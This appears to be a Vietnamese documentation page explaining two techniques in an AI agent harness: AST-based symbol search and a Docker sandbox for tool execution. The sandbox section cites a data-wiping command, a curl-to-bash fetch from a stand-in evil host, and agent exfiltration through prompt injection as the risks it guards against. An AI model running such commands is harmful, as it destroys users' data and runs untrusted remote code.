  <Technique
    id={"t28"}
    title={"T28. LSP-based code intelligence qua AST"}
    tid={"G.2"}
    location={"<strong>File:</strong> <code>src/openharness/services/lsp/__init__.py</code> · <strong>Lines:</strong> 1–100 · <strong>API:</strong> <code>list_document_symbols</code>, <code>workspace_symbol_search</code>, <code>go_to_definition</code>, <code>find_references</code>, <code>hover</code>"}
  >
    <Fragment is:raw>
      <h4>Code từ OpenHarness</h4> <pre><code><span class="kw">import</span> ast
      <span class="kw">from</span> pathlib <span class="kw">import</span> Path
      <span class="kw">def</span> <span
      class="fn">list_document_symbols</span>(file_path: Path) -&gt;
      list[Symbol]: <span class="str">"""Trả về top-level functions, classes,
      methods trong 1 file Python qua ast.parse() — không cần spawn language
      server ngoài."""</span> source = file_path.read_text(encoding=<span
      class="str">"utf-8"</span>, errors=<span class="str">"replace"</span>)
      <span class="kw">try</span>: tree = ast.parse(source) <span
      class="kw">except</span> SyntaxError: <span class="kw">return</span> []
      symbols = [] <span class="kw">for</span> node <span class="kw">in</span>
      ast.walk(tree): <span class="kw">if</span> isinstance(node,
      (ast.FunctionDef, ast.AsyncFunctionDef)): symbols.append(Symbol(
      name=node.name, kind=<span class="str">"function"</span>,
      line=node.lineno, col=node.col_offset, )) <span class="kw">elif</span>
      isinstance(node, ast.ClassDef): symbols.append(Symbol( name=node.name,
      kind=<span class="str">"class"</span>, line=node.lineno,
      col=node.col_offset, )) <span class="kw">for</span> item <span
      class="kw">in</span> node.body: <span class="kw">if</span>
      isinstance(item, (ast.FunctionDef, ast.AsyncFunctionDef)):
      symbols.append(Symbol( name=<span
      class="str">f"{node.name}.{item.name}"</span>, kind=<span
      class="str">"method"</span>, line=item.lineno, col=item.col_offset, ))
      <span class="kw">return</span> symbols <span class="kw">def</span> <span
      class="fn">workspace_symbol_search</span>(root: Path, query: str) -&gt;
      list[Symbol]: <span class="str">"""Search symbol name across all *.py
      files — case-insensitive substring."""</span> results = [] <span
      class="kw">for</span> py_file <span class="kw">in</span> root.rglob(<span
      class="str">"*.py"</span>): <span class="kw">if</span>
      any(part.startswith(<span class="str">"."</span>) <span
      class="kw">for</span> part <span class="kw">in</span> py_file.parts):
      <span class="kw">continue</span> <span class="kw">for</span> sym <span
      class="kw">in</span> list_document_symbols(py_file): <span
      class="kw">if</span> query.lower() <span class="kw">in</span>
      sym.name.lower(): results.append(sym._replace(file=py_file)) <span
      class="kw">return</span> results </code></pre> <div
      class="why"><strong>Tại sao quan trọng:</strong> Thay vì spawn
      <code>pyright</code>/<code>pylsp</code> (heavy, cần config, khởi động
      chậm), OpenHarness dùng <strong>Python stdlib <code>ast</code></strong> để
      tự parse read-only. Trade-off: không có type inference, không theo được
      import qua package, nhưng <em>đủ dùng</em> cho 80% use case của agent (tìm
      function, class, method signature). Agent gọi
      <code>workspace_symbol_search("handle_message")</code> thay vì <code>grep
      -rn "def handle_message"</code> — kết quả structured, có line/col chính
      xác.</div> <h4>Code example (generic)</h4> <pre><code><span
      class="kw">import</span> ast <span class="kw">from</span> pathlib <span
      class="kw">import</span> Path <span class="kw">def</span> <span
      class="fn">find_function_definition</span>(file: Path, name: str) -&gt;
      <span class="type">tuple</span>[int, int] | <span class="kw">None</span>:
      <span class="kw">try</span>: tree = ast.parse(file.read_text()) <span
      class="kw">except</span> SyntaxError: <span class="kw">return</span> <span
      class="kw">None</span> <span class="kw">for</span> node <span
      class="kw">in</span> ast.walk(tree): <span class="kw">if</span>
      isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)) \ <span
      class="kw">and</span> node.name == name: <span class="kw">return</span>
      (node.lineno, node.col_offset) <span class="kw">return</span> <span
      class="kw">None</span> <span class="kw">def</span> <span
      class="fn">find_references</span>(root: Path, name: str) -&gt; list[<span
      class="type">tuple</span>[Path, int]]: <span class="str">"""Approximate:
      tìm Name/Attribute có id trùng."""</span> hits = [] <span
      class="kw">for</span> py <span class="kw">in</span> root.rglob(<span
      class="str">"*.py"</span>): <span class="kw">try</span>: tree =
      ast.parse(py.read_text()) <span class="kw">except</span> SyntaxError:
      <span class="kw">continue</span> <span class="kw">for</span> node <span
      class="kw">in</span> ast.walk(tree): <span class="kw">if</span>
      isinstance(node, ast.Name) <span class="kw">and</span> node.id == name:
      hits.append((py, node.lineno)) <span class="kw">elif</span>
      isinstance(node, ast.Attribute) <span class="kw">and</span> node.attr ==
      name: hits.append((py, node.lineno)) <span class="kw">return</span> hits
      </code></pre>
    </Fragment>
    <ProsCons
      pros={[
        "Zero-dep (chỉ stdlib <code>ast</code>) — không cần LSP server",
        "Read-only, không có side effect → an toàn cho agent tool",
        "Line/col chính xác, structured output",
        "Parse 1 file &lt; 10ms kể cả file lớn",
      ]}
      cons={[
        "Chỉ hiểu syntax, không có type/semantic",
        "Go-to-definition qua <code>import</code> phải tự resolve",
        "Chỉ support Python (các ngôn ngữ khác cần adapter riêng)",
        "Không catch được macro/meta-class magic",
      ]}
    />
    <RefList
      items={[
        '<a href="https://microsoft.github.io/language-server-protocol/">Microsoft LSP spec</a>',
        '<a href="https://docs.python.org/3/library/ast.html">Python ast module docs</a>',
        '<a href="https://github.com/davidhalter/jedi">Jedi — Python autocompletion</a>',
      ]}
    />
  </Technique>
  <Technique
    id={"t29"}
    title={"T29. Docker sandbox cho tool execution"}
    tid={"G.3"}
    location={"<strong>File:</strong> <code>src/openharness/sandbox/docker_backend.py</code> · <strong>Container:</strong> <code>openharness-sandbox-&lt;session_id&gt;</code> · <strong>Optional:</strong> <code>--sandbox docker</code> flag"}
  >
    <Fragment is:raw>
      <h4>Code từ OpenHarness</h4> <pre><code><span class="kw">import</span>
      docker <span class="kw">from</span> docker.errors <span
      class="kw">import</span> DockerException <span class="kw">class</span>
      <span class="type">DockerSandbox</span>: <span class="str">"""Wrap tool
      execution trong container isolated. Tool nhận được stdin/stdout qua
      container exec, không thấy host filesystem trừ volume mount có kiểm
      soát."""</span> <span class="kw">def</span> <span
      class="fn">__init__</span>(self, session_id: str, workdir: Path):
      self.name = <span class="str">f"openharness-sandbox-{session_id}"</span>
      self.workdir = workdir self._client = <span class="kw">None</span>
      self._container = <span class="kw">None</span> <span class="kw">def</span>
      <span class="fn">check_available</span>(self) -&gt; bool: <span
      class="str">"""Pre-flight: Docker daemon running? Platform
      supported?"""</span> <span class="kw">try</span>: self._client =
      docker.from_env(timeout=5) self._client.ping() <span
      class="kw">return</span> <span class="kw">True</span> <span
      class="kw">except</span> DockerException <span class="kw">as</span> e:
      log.warning(<span class="str">f"Docker not available: {e}"</span>) <span
      class="kw">return</span> <span class="kw">False</span> <span
      class="kw">async def</span> <span class="fn">start</span>(self):
      self._container = self._client.containers.run( image=<span
      class="str">"openharness/sandbox:latest"</span>, name=self.name,
      detach=<span class="kw">True</span>, stdin_open=<span
      class="kw">True</span>, tty=<span class="kw">True</span>,
      network_mode=<span class="str">"bridge"</span>, <span class="com"># có
      net; dùng "none" nếu muốn offline</span> mem_limit=<span
      class="str">"2g"</span>, cpu_quota=100_000, <span class="com"># 1
      CPU</span> read_only=<span class="kw">False</span>, <span class="com">#
      agent cần ghi vào /workspace</span> volumes={ str(self.workdir): {<span
      class="str">"bind"</span>: <span class="str">"/workspace"</span>, <span
      class="str">"mode"</span>: <span class="str">"rw"</span>}, },
      working_dir=<span class="str">"/workspace"</span>, environment={<span
      class="str">"OPENHARNESS_SANDBOX"</span>: <span class="str">"1"</span>}, )
      <span class="kw">async def</span> <span class="fn">exec</span>(self, cmd:
      list[str], timeout: int = 600) -&gt; ExecResult: <span
      class="kw">if</span> self._container <span class="kw">is</span> <span
      class="kw">None</span>: <span class="kw">raise</span> RuntimeError(<span
      class="str">"sandbox not started"</span>) result =
      self._container.exec_run( cmd=cmd, stdout=<span class="kw">True</span>,
      stderr=<span class="kw">True</span>, demux=<span class="kw">True</span>, )
      <span class="kw">return</span> ExecResult(exit_code=result.exit_code,
      output=result.output) <span class="kw">async def</span> <span
      class="fn">cleanup</span>(self): <span class="kw">if</span>
      self._container: self._container.remove(force=<span
      class="kw">True</span>) </code></pre> <div class="why"><strong>Tại sao
      quan trọng:</strong> Agent chạy bash/python tool trên host luôn có rủi ro:
      <code>rm -rf ~/</code>, <code>curl evil.sh | bash</code>, hay exfil
      credentials. Docker sandbox cô lập: agent ghi vào <code>/workspace</code>
      (volume), mọi thứ ngoài đó bị container file-system cover. Kết hợp với
      <strong>network_mode</strong> (bridge/none), <strong>mem_limit</strong>,
      <strong>cpu_quota</strong>, sandbox chặn cả "agent crazy → consume all
      RAM" và "agent bị prompt injection → exfil". Pre-flight
      <code>check_available()</code> cho phép graceful fallback về non-sandbox
      nếu Docker thiếu (CI, VM nhỏ).</div> <h4>Code example (generic)</h4>
      <pre><code><span class="kw">import</span> docker, tempfile, subprocess
      <span class="kw">def</span> <span
      class="fn">run_tool_in_container</span>(cmd: list[str], workdir: str,
      timeout: int = 60): client = docker.from_env() <span
      class="kw">try</span>: container = client.containers.run( <span
      class="str">"python:3.12-slim"</span>, cmd, volumes={workdir: {<span
      class="str">"bind"</span>: <span class="str">"/work"</span>, <span
      class="str">"mode"</span>: <span class="str">"rw"</span>}},
      working_dir=<span class="str">"/work"</span>, mem_limit=<span
      class="str">"512m"</span>, network_disabled=<span class="kw">True</span>,
      <span class="com"># no egress</span> remove=<span class="kw">True</span>,
      <span class="com"># auto-cleanup</span> detach=<span
      class="kw">False</span>, stdout=<span class="kw">True</span>, stderr=<span
      class="kw">True</span>, ) <span class="kw">return</span>
      container.decode(<span class="str">"utf-8"</span>, errors=<span
      class="str">"replace"</span>) <span class="kw">except</span>
      docker.errors.ContainerError <span class="kw">as</span> e: <span
      class="kw">return</span> <span class="str">f"[exit {e.exit_status}]:
      {e.stderr.decode()}"</span> <span class="com"># Fallback if Docker
      missing</span> <span class="kw">def</span> <span
      class="fn">run_tool</span>(cmd: list[str], workdir: str): <span
      class="kw">if</span> docker_available(): <span class="kw">return</span>
      run_tool_in_container(cmd, workdir) <span class="kw">return</span>
      subprocess.run(cmd, cwd=workdir, capture_output=<span
      class="kw">True</span>, text=<span class="kw">True</span>) </code></pre>
    </Fragment>
    <ProsCons
      pros={[
        "Blast radius limited tới container → host an toàn",
        "Resource limits (mem/cpu/network) chặn DoS",
        "Reproducible env (image pin version)",
        "Optional — không ép Docker nếu user không có",
      ]}
      cons={[
        "Cần Docker daemon — bỏ được một phần user (VM nhỏ, CI restricted)",
        "Overhead khởi động container (~1s) cho mỗi session",
        "Bind mount <code>/workspace</code> rw — nếu attacker escape chroot, vẫn hạ host dir",
        "Image <code>openharness/sandbox:latest</code> phải được build &amp; publish → supply-chain risk",
      ]}
    />
